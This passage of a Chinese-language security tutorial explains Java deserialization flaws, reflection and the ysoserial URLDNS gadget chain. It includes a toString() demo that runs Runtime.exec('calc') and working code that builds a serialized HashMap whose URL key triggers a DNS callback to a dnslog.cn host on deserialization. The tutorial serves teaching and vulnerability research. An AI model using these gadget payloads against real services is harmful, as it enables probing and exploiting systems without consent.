class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png"></p><p><code>URL</code> 类在 JDK 里是自带的类，它的 <code>hashCode()</code> 方法里会触发 DNS 解析  </p><p> 入口参数里包含了可控的类（<code>URL</code>），而该类在反序列化过程中会自动调用危险方法（<code>hashCode()</code> 触发 DNS 解析），那么在 <code>readObject()</code> 反序列化时就会执行这些危险逻辑，造成安全风险。  </p><h4 id="HashMap-找入口类分析："><a href="#HashMap-找入口类分析：" class="headerlink" title="HashMap 找入口类分析："></a>HashMap 找入口类分析：</h4><p>本例中的代码利用了 <font style="color:#080808;background-color:#ffffff;">HashMap&lt;URL, Integer&gt;</font>，那么看看为什么它会造成漏洞</p><p>跟进 HashMap ，此处继承了 <font style="color:#080808;background-color:#ffffff;">Serializable</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png"></p><p>找到重写的 readObject</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png"></p><p>跟进 hash</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png"></p><p>跟进 hashCode,<font style="color:rgb(80, 80, 92);">hashCode 位置处于 Object 类当中</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png"></p><p>这样，HashMap 完美满足了可序列化、重写 readObject、接收任意对象作为参数、JDK 自带的入口类条件。</p><h3 id="1-5-3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用"><a href="#1-5-3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a><font style="color:rgb(51, 51, 51);">1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font></h3><h3 id="1-5-4-构造函数-静态代码块等类加载时隐式执行"><a href="#1-5-4-构造函数-静态代码块等类加载时隐式执行" class="headerlink" title="1.5.4 构造函数&#x2F;静态代码块等类加载时隐式执行"></a><font style="color:rgb(51, 51, 51);">1.5.4 构造函数&#x2F;静态代码块等类加载时隐式执行</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>     <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>&#125;  <br><br><span class="hljs-comment">//对obj对象进行输出 默认调用原始对象的toString 方法</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><p> 在 <code>toString()</code> 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码  </p><h2 id="1-6-找漏洞的三个条件"><a href="#1-6-找漏洞的三个条件" class="headerlink" title="1.6 找漏洞的三个条件"></a>1.6 找漏洞的三个条件</h2><p>首先一个前提：<strong><font style="color:rgb(80, 80, 92);">继承了 </font></strong><font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">，使对象可序列化</font></p><ul><li>入口类 source<ul><li>可序列化</li><li>重写 readObject 调用常见函数</li><li>接收任意对象作为参数，参数类型宽泛</li><li>最后 JDK 自带</li></ul></li><li>调用链 gadget chain</li><li>执行类 sink <ul><li><font style="color:rgb(80, 80, 92);">RCE SSRF 写文件等等</font></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png"></p><h1 id="2、Java-反射-URLDNS-链"><a href="#2、Java-反射-URLDNS-链" class="headerlink" title="2、Java 反射+URLDNS 链"></a><font style="color:rgb(76, 76, 87);">2、Java 反射+URLDNS 链</font></h1><h2 id="2-1-Java-反射理解"><a href="#2-1-Java-反射理解" class="headerlink" title="2.1 Java 反射理解"></a>2.1 Java 反射理解</h2><blockquote><p><font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font></p><p><a href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p></blockquote><p>反射的作用：让 Java 具有动态性</p><h3 id="2-1-1-静态语言-VS-动态语言"><a href="#2-1-1-静态语言-VS-动态语言" class="headerlink" title="2.1.1 静态语言 VS 动态语言"></a>2.1.1 静态语言 VS 动态语言</h3><p>Java 本身使一种静态语言，编译时就决定了类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编译器认为 student 的类型是 Student，</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>而动态语言，比如PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// 此时 $var 是字符串</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">123</span>;      <span class="hljs-comment">// 运行时再赋值，现在 $var 就是整数</span><br></code></pre></td></tr></table></figure><p>再次对比：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png"></p><h3 id="2-1-2-正射与反射"><a href="#2-1-2-正射与反射" class="headerlink" title="2.1.2 正射与反射"></a><font style="color:rgb(76, 76, 87);">2.1.2 正射与反射</font></h3><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html">官方对反射的解释</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png"></p><p><strong>反射机制</strong>使Java代码能够探查已加载类的字段、方法及构造函数信息，并在安全限制范围内，通过反射字段、方法和构造函数对这些底层对应元素进行操作。该 API 既支持需要访问目标对象公共成员（基于其运行时类）的应用程序，也支持访问给定类声明成员的场景，同时允许程序抑制默认的反射访问控制。</p><p><strong>正射（直接调用）：在未运行时（编译时）已经知道了要运行的类</strong> <strong>Student</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png"></p><p><strong>反射：在运行的时候 forName 从 className&#x3D;”com.demo02.Student” 加载 Student 类，再去调用方法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png"></p><h3 id="2-1-3-Class-对象理解"><a href="#2-1-3-Class-对象理解" class="headerlink" title="2.1.3 Class 对象理解"></a>2.1.3 Class 对象理解</h3><p><font style="color:rgb(37, 41, 51);"> 先理解 ：</font><strong><font style="color:rgb(37, 41, 51);">RTTI（Run-Time Type Identification）运行时类型识别</font></strong></p><p>Java 在运行时识别对象和类的信息主要以俩种方式：一种是 RTTI ，它假定我们在编译期已知道了所有类型；另一种是 反射，在运行时发现和使用类的信息。</p><p><strong><font style="color:rgb(37, 41, 51);">每个类都有一个Class对象</font></strong><font style="color:rgb(37, 41, 51);">，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。</font></p><p><font style="color:rgb(37, 41, 51);">比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。</font></p><p><strong><font style="color:rgb(37, 41, 51);">Class类的对象作用</font></strong><font style="color:rgb(37, 41, 51);">是运行时提供或获得某个对象的类型信息</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp"></p><h2 id="2-2-反射使用"><a href="#2-2-反射使用" class="headerlink" title="2.2 反射使用"></a>2.2 反射使用</h2><h3 id="2-2-1-反射中极为重要的方法"><a href="#2-2-1-反射中极为重要的方法" class="headerlink" title="2.2.1 反射中极为重要的方法"></a>2.2.1 反射中极为重要的方法</h3><ul><li>获取类的方法：forName</li><li>实例化类对象的方法：newInstance</li><li>获取函数的方法：getMethod</li><li>执行函数的方法：invoke</li></ul><h3 id="2-2-2-获取-Class-类对象"><a href="#2-2-2-获取-Class-类对象" class="headerlink" title="2.2.2 获取 Class 类对象"></a>2.2.2 获取 Class 类对象</h3><ul><li>已知<strong>具体的类</strong>，通过类的 <strong>class</strong> 属性获取，</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure><ul><li>已知某个<strong>类的实例</strong>，调用该实例的 **getClass() **方法获取 Class 对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure><ul><li>已知一个<strong>类的全类名</strong>，且该类在类路径下，可通过 Class 类的<strong>静态方法 forName()</strong> 获取，可能抛出 ClassNotFoundException</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-comment">//测试 class 类的创建方式有哪些</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(<span class="hljs-string">&quot;这个人是：&quot;</span>+person.name);<br><br>        <span class="hljs-comment">//方式一：通过对象获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> person.getClass();<br>        System.out.println(c1.hashCode());<br><br>        <span class="hljs-comment">//方式二：foename 获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Student&quot;</span>);<br>        System.out.println(c2.hashCode());<br><br>        <span class="hljs-comment">//方式三：通过类名 .class 获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Student.class;<br>        System.out.println(c3.hashCode());<br><br>        <span class="hljs-comment">//方式四：基本内置类型的包装类都有一个 Type 属性</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> Integer.TYPE;<br>        System.out.println(c4);<br><br>        <span class="hljs-comment">//获得父类类型</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c5</span> <span class="hljs-operator">=</span> c1.getSuperclass();<br>        System.out.println(c5);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;student&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-3-实例化-创建对象"><a href="#2-2-3-实例化-创建对象" class="headerlink" title="2.2.3 实例化&#x2F;创建对象"></a>2.2.3 实例化&#x2F;创建对象</h3><blockquote><p>因为 Class 类是 <code>private</code> 私有属性，我们也无法通过创建对象的方式来获取 class 对象</p></blockquote><ul><li>通过 Class 的 **newInstance() **方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//newInstance 不能传参</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (Person) c.newInstance();<br>System.out.println(p1);<br></code></pre></td></tr></table></figure><ul><li>通过 Constructor 的 newInstance() 方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;asd&quot;</span>, <span class="hljs-number">11</span>);<br>System.out.println(p2);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png"></p><h3 id="2-2-3-获取类里面的属性-Filed"><a href="#2-2-3-获取类里面的属性-Filed" class="headerlink" title="2.2.3 获取类里面的属性 Filed"></a>2.2.3 获取类里面的属性 Filed</h3><ul><li>getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得 public 类型的属性</li><li>getFields()：获得类的 public 类型的属性</li><li>getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得所有类型的属性</li><li>getDeclaredFields()：获得类的所有类型的属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取类里面的属性</span><br>Field[] personfields1 = c.getFields();<br><span class="hljs-keyword">for</span> (Field field : personfields1) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br>Field[] personfields2 = c.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field : personfields2) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">idfield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;id&quot;</span>);<br>System.out.println(idfield);<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">allfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(allfield);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png"></p><h3 id="2-2-4-获取类的方法-Method"><a href="#2-2-4-获取类的方法-Method" class="headerlink" title="2.2.4 获取类的方法 Method"></a>2.2.4 获取类的方法 Method</h3><ul><li>getMethod(String name, Class&lt;?&gt;… parameterTypes)：指定方法名和参数类型，可获得 public 方法（包含父类继承的）。</li><li>getMethods()：获得类及父类的所有 public 方法。</li><li>getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes)：指定方法名和参数类型，可获得本类声明的任意方法（包括 private、protected、默认、public）。</li><li>getDeclaredMethods()：获得类中声明的所有方法（不含父类）。</li></ul><h3 id="2-2-5-获取类的构造器-Constructor"><a href="#2-2-5-获取类的构造器-Constructor" class="headerlink" title="2.2.5 获取类的构造器 Constructor"></a>2.2.5 获取类的构造器 Constructor</h3><ul><li>getConstructor(Class&lt;?&gt;… parameterTypes)：指定参数类型，可获得 public 构造器。</li><li>getConstructors()：获得类的所有 public 构造器。</li><li>getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)：指定参数类型，可获得类的任意构造器（包括 private）。</li><li>getDeclaredConstructors()：获得类的所有构造器（不论修饰符）。</li></ul><h2 id="2-3-URLDNS-链"><a href="#2-3-URLDNS-链" class="headerlink" title="2.3 URLDNS 链"></a>2.3 URLDNS 链</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p>URLDNS 是  ysoserial 中的一个利用链：</p><ul><li><p>Gadget Chain:</p></li><li><pre><code class="hljs">HashMap.readObject()</code></pre></li><li><pre><code class="hljs">  HashMap.putVal()</code></pre></li><li><pre><code class="hljs">    HashMap.hash()</code></pre></li><li><pre><code class="hljs">      URL.hashCode()</code></pre></li></ul><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>首先是因为 HashMap（java&#x2F;util&#x2F;HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 <font style="color:#080808;background-color:#ffffff;">K key &#x3D; (K) s.readObject(); 进行反序列化，之后调用  putVal() -&gt; hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：</font><a href="#KmszU">HashMap 找入口类分析</a><font style="color:#080808;background-color:#ffffff;">】</font></p><p><font style="color:#080808;background-color:#ffffff;">接下来查看 URL（java&#x2F;net&#x2F;URL.java），URL 中继承了 </font><strong><font style="color:#080808;background-color:#ffffff;">Serializable，</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png"></p><p>跟进 hashCode</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png"></p><p><code>getHostAddress(u)</code> 会尝试把 URL 中的主机名解析成一个 <code>InetAddress</code> 对象（也就是 IP 地址）， 如果主机名解析成功（<code>addr</code> 不为 null），就把解析出来的 IP 地址的 <code>hashCode()</code> 加入到 <code>h</code>（整个 URL 的哈希值）里  ； 如果 DNS 没解析成功（<code>addr == null</code>），那就直接取 URL 原始的 <code>host</code> 字符串  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png"></p><p>跟进 getHostAddress，<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)方法会去解析主机名，</font></p><ul><li>如果 <code>host</code> 是 IP 地址，直接转换成 <code>InetAddress</code>，不会走 DNS</li><li>如果 <code>host</code> 是域名，这里就会向系统的 <strong>DNS 解析器</strong> 发起请求，解析成 IP</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png"></p><hr><hr><p><strong>完整的利用链：</strong></p><p> HashMap.readObject()</p><p>-&gt; HashMap.putVal()</p><p>-&gt; HashMap.hash()</p><p>-&gt; URL.hashCode()</p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()</p><p>-&gt; getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  【这里发出 DNS 请求】</font></p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9zuzrq.dnslog.cn&quot;</span>),<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>首先执行序列化，发现触发了dns 请求？</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png"></p><p>回到源码中：当 hashCode 不为 -1 时，直接返回 hashCode，不再执行下面代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png"></p><p>我们知道，第一次将 key（也就是 dnslog）传入 URL.hashCode 时，hashCode &#x3D;&#x3D; -1（-1 表示没有计算过），执行 hashCode &#x3D; handler.hashCode(this); ，而根据之前的分析，  handler.hashCode  -&gt; getHostAddress -&gt; InetAddress.getByName(host) -&gt; 发起dns请求，所以说，序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求。</p><p>那么如何不在第一次发起请求？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br><span class="hljs-comment">//这里不使用 put</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yjgubh.dnslog.cn&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//人为修改 URL.hashCode 缓存值，</span><br>hashcodefield.set(url,<span class="hljs-number">12134</span>);<br><span class="hljs-comment">//由于 hashCode != -1，它直接返回 12134，不会触发 DNS，只是把 URL 当 key 存进去</span><br><span class="hljs-comment">//存进去之后：此时 HashMap 内部只记录：key = URL(&quot;http://xx.dnslog.cn&quot;);key 的 hash 值 = 12134;value = 1</span><br>hashmap.put(url,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//反序列化之前把 hashcode 改回 -1,恢复 URL.hashCode 的默认状态,下一次调用 url.hashCode() 时，会重新计算并触发 DNS 解析</span><br>hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>序列化的过程就不会 DNS 解析：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png"></p><p>只有反序列化的时候触发 DNS 解析：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png"></p><h3 id="学习-ysoserial-中的-URLDNS："><a href="#学习-ysoserial-中的-URLDNS：" class="headerlink" title="学习 ysoserial 中的 URLDNS："></a>学习 ysoserial 中的 URLDNS：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//避免提前解析</span><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-comment">//创建 HashMap + URL</span><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span 